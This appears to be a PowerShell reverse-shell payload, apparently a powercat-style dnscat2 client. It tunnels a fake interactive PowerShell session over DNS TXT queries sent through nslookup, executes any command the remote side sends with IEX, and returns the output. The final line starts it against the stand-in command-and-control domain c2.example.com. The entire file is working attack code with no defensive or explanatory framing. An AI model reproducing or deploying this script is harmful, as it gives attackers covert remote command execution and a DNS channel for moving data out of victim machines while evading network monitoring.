function Stream1_Setup
{

    param($FuncSetupVars)
    if($global:Verbose){$Verbose = $True}
    function ConvertTo-HexArray
    {
      param($String)
      $Hex = @()
      $String.ToCharArray() | % {"{0:x}" -f [byte]$_} | % {if($_.Length -eq 1){"0" + [string]$_} else{[string]$_}} | % {$Hex += $_}
      return $Hex
    }
    
    function SendPacket
    {
      param($Packet,$DNSServer,$DNSPort)
      $Command = ("set type=TXT`nserver $DNSServer`nset port=$DNSPort`nset domain=.com`nset retry=1`n" + $Packet + "`nexit")
      $result = ($Command | nslookup 2>&1 | Out-String)
      if($result.Contains('"')){return ([regex]::Match($result.replace("bio=",""),'(?<=")[^"]*(?=")').Value)}
      else{return 1}
    }
    
    function Create_SYN
    {
      param($SessionId,$SeqNum,$Tag,$Domain)
      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "00" + $SessionId + $SeqNum + "0000" + $Domain)
    }
    
    function Create_FIN
    {
      param($SessionId,$Tag,$Domain)
      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "02" + $SessionId + "00" + $Domain)
    }
    
    function Create_MSG
    {
      param($SessionId,$SeqNum,$AcknowledgementNumber,$Data,$Tag,$Domain)
      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "01" + $SessionId + $SeqNum + $AcknowledgementNumber + $Data + $Domain)
    }
    
    function DecodePacket
    {
      param($Packet)
      
      if((($Packet.Length)%2 -eq 1) -or ($Packet.Length -eq 0)){return 1}
      $AcknowledgementNumber = ($Packet[10..13] -join "")
      $SeqNum = ($Packet[14..17] -join "")
      [byte[]]$ReturningData = @()
      
      if($Packet.Length -gt 18)
      {
        $PacketElim = $Packet.Substring(18)
        while($PacketElim.Length -gt 0)
        {
          $ReturningData += [byte[]][Convert]::ToInt16(($PacketElim[0..1] -join ""),16)
          $PacketElim = $PacketElim.Substring(2)
        }
      }
      
      return $Packet,$ReturningData,$AcknowledgementNumber,$SeqNum
    }
    
    function AcknowledgeData
    {
      param($ReturningData,$AcknowledgementNumber)
      $Hex = [string]("{0:x}" -f (([uint16]("0x" + $AcknowledgementNumber) + $ReturningData.Length) % 65535))
      if($Hex.Length -ne 4){$Hex = (("0"*(4-$Hex.Length)) + $Hex)}
      return $Hex
    }
    $FuncVars = @{}
    $FuncVars["DNSServer"],$FuncVars["DNSPort"],$FuncVars["Domain"],$FuncVars["FailureThreshold"] = $FuncSetupVars
    if($FuncVars["DNSPort"] -eq ''){$FuncVars["DNSPort"] = "53"}
    $FuncVars["Tag"] = ""
    $FuncVars["Domain"] = ("." + $FuncVars["Domain"])
    
    $FuncVars["Create_SYN"] = ${function:Create_SYN}
    $FuncVars["Create_MSG"] = ${function:Create_MSG}
    $FuncVars["Create_FIN"] = ${function:Create_FIN}
    $FuncVars["DecodePacket"] = ${function:DecodePacket}
    $FuncVars["ConvertTo-HexArray"] = ${function:ConvertTo-HexArray}
    $FuncVars["AckData"] = ${function:AcknowledgeData}
    $FuncVars["SendPacket"] = ${function:SendPacket}
    $FuncVars["SessionId"] = ([string](Get-Random -Maximum 9999 -Minimum 1000))
    $FuncVars["SeqNum"] = ([string](Get-Random -Maximum 9999 -Minimum 1000))
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    $FuncVars["Failures"] = 0
    
    $SYNPacket = (Invoke-Command $FuncVars["Create_SYN"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["Tag"],$FuncVars["Domain"]))
    $ResponsePacket = (Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($SYNPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]))
    $DecodedPacket = (Invoke-Command $FuncVars["DecodePacket"] -ArgumentList @($ResponsePacket))
    if($DecodedPacket -eq 1){return "Bad SYN response. Ensure your server is set up correctly."}
    $ReturningData = $DecodedPacket[1]
    if($ReturningData -ne ""){$FuncVars["InputData"] = ""}
    $FuncVars["AckNum"] = $DecodedPacket[2]
    $FuncVars["MaxMSGDataSize"] = (244 - (Invoke-Command $FuncVars["Create_MSG"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["AckNum"],"",$FuncVars["Tag"],$FuncVars["Domain"])).Length)
    if($FuncVars["MaxMSGDataSize"] -le 0){return "Domain name is too long."}
    return $FuncVars
  
}

function Stream1_ReadData
{

    param($FuncVars)
    if($global:Verbose){$Verbose = $True}
    
    $PacketsData = @()
    $PacketData = ""
    
    if($FuncVars["InputData"] -ne $null)
    {
      $Hex = (Invoke-Command $FuncVars["ConvertTo-HexArray"] -ArgumentList @($FuncVars["InputData"]))
      $SectionCount = 0
      $PacketCount = 0
      foreach($Char in $Hex)
      {
        if($SectionCount -ge 30)
        {
          $SectionCount = 0
          $PacketData += "."
        }
        if($PacketCount -ge ($FuncVars["MaxMSGDataSize"]))
        {
          $PacketsData += $PacketData.TrimEnd(".")
          $PacketCount = 0
          $SectionCount = 0
          $PacketData = ""
        }
        $PacketData += $Char
        $SectionCount += 2
        $PacketCount += 2
      }
      $PacketData = $PacketData.TrimEnd(".")
      $PacketsData += $PacketData
      $FuncVars["InputData"] = ""
    }
    else
    {
      $PacketsData = @("")
    }
    
    [byte[]]$ReturningData = @()
    foreach($PacketData in $PacketsData)
    {
      try{$MSGPacket = Invoke-Command $FuncVars["Create_MSG"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["AckNum"],$PacketData,$FuncVars["Tag"],$FuncVars["Domain"])}
      catch{ Write-Verbose "DNSCAT2: Failed to create packet." ; $FuncVars["Failures"] += 1 ; continue }
      try{$Packet = (Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($MSGPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]))}
      catch{ Write-Verbose "DNSCAT2: Failed to send packet." ; $FuncVars["Failures"] += 1 ; continue }
      try
      {
        $DecodedPacket = (Invoke-Command $FuncVars["DecodePacket"] -ArgumentList @($Packet))
        if($DecodedPacket.Length -ne 4){ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..."; $FuncVars["Failures"] += 1 ; continue }
        $FuncVars["AckNum"] = $DecodedPacket[2]
        $FuncVars["SeqNum"] = $DecodedPacket[3]
        $ReturningData += $DecodedPacket[1]
      }
      catch{ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..." ; $FuncVars["Failures"] += 1 ; continue }
      if($DecodedPacket -eq 1){ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..." ; $FuncVars["Failures"] += 1 ; continue }
    }
    
    if($FuncVars["Failures"] -ge $FuncVars["FailureThreshold"]){break}
    
    if($ReturningData -ne @())
    {
      $FuncVars["AckNum"] = (Invoke-Command $FuncVars["AckData"] -ArgumentList @($ReturningData,$FuncVars["AckNum"]))
    }
    return $ReturningData,$FuncVars
  
}

function Stream1_WriteData
{

    param($Data,$FuncVars)
    $FuncVars["InputData"] = $FuncVars["Encoding"].GetString($Data)
    return $FuncVars
  
}

function Stream1_Close
{

    param($FuncVars)
    $FINPacket = Invoke-Command $FuncVars["Create_FIN"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["Tag"],$FuncVars["Domain"])
    Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($FINPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]) | Out-Null
  
}

function Main
{

    param($Stream1SetupVars)   
    try
    {
      $encoding = New-Object System.Text.AsciiEncoding
      [byte[]]$InputToWrite = @()
      if($i -ne $null)
      {
        Write-Verbose "Input from -i detected..."
        if(Test-Path $i){ [byte[]]$InputToWrite = ([io.file]::ReadAllBytes($i)) }
        elseif($i.GetType().Name -eq "Byte[]"){ [byte[]]$InputToWrite = $i }
        elseif($i.GetType().Name -eq "String"){ [byte[]]$InputToWrite = $Encoding.GetBytes($i) }
        else{Write-Host "Unrecognised input type." ; return}
      }
    
      Write-Verbose "Setting up Stream 1... (ESC/CTRL to exit)"
      try{$Stream1Vars = Stream1_Setup $Stream1SetupVars}
      catch{Write-Verbose "Stream 1 Setup Failure" ; return}
      
      Write-Verbose "Setting up Stream 2... (ESC/CTRL to exit)"
      try
      {
        $IntroPrompt = $Encoding.GetBytes("Windows PowerShell`nCopyright (C) 2013 Microsoft Corporation. All rights reserved.`n`n" + ("PS " + (pwd).Path + "> "))
        $Prompt = ("PS " + (pwd).Path + "> ")
        $CommandToExecute = ""      
        $Data = $null
      }
      catch
      {
        Write-Verbose "Stream 2 Setup Failure" ; return
      }
      
      if($InputToWrite -ne @())
      {
        Write-Verbose "Writing input to Stream 1..."
        try{$Stream1Vars = Stream1_WriteData $InputToWrite $Stream1Vars}
        catch{Write-Host "Failed to write input to Stream 1" ; return}
      }
      
      if($d){Write-Verbose "-d (disconnect) Activated. Disconnecting..." ; return}
      
      Write-Verbose "Both Communication Streams Established. Redirecting Data Between Streams..."
      while($True)
      {        
        try
        {
          ##### Stream2 Read #####
          $Prompt = $null
          $ReturnedData = $null
          if($CommandToExecute -ne "")
          {
            try{[byte[]]$ReturnedData = $Encoding.GetBytes((IEX $CommandToExecute 2>&1 | Out-String))}
            catch{[byte[]]$ReturnedData = $Encoding.GetBytes(($_ | Out-String))}
            $Prompt = $Encoding.GetBytes(("PS " + (pwd).Path + "> "))
          }
          $Data += $IntroPrompt
          $IntroPrompt = $null
          $Data += $ReturnedData
          $Data += $Prompt
          $CommandToExecute = ""
          ##### Stream2 Read #####

          if($Data -ne $null){$Stream1Vars = Stream1_WriteData $Data $Stream1Vars}
          $Data = $null
        }
        catch
        {
          Write-Verbose "Failed to redirect data from Stream 2 to Stream 1" ; return
        }
        
        try
        {
          $Data,$Stream1Vars = Stream1_ReadData $Stream1Vars
          if($Data.Length -eq 0){Start-Sleep -Milliseconds 100}
          if($Data -ne $null){$CommandToExecute = $Encoding.GetString($Data)}
          $Data = $null
        }
        catch
        {
          Write-Verbose "Failed to redirect data from Stream 1 to Stream 2" ; return
        }
      }
    }
    finally
    {
      try
      {
        Write-Verbose "Closing Stream 1..."
        Stream1_Close $Stream1Vars
      }
      catch
      {
        Write-Verbose "Failed to close Stream 1"
      }
    }
  
}

Main @('','','c2.example.com',10) 


